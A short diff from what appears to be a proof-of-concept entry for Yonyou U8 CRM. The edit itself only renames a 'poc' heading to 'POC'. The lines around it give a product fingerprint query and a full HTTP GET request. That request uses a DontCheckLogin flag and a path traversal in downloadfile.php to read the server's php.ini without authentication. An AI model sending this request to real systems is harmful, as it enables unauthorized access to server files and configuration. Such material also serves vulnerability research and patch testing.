@@ -7,7 +7,7 @@
 app="用友U8CRM"
 ```
 
-## poc
+## POC
 ```
 GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
 Host: 
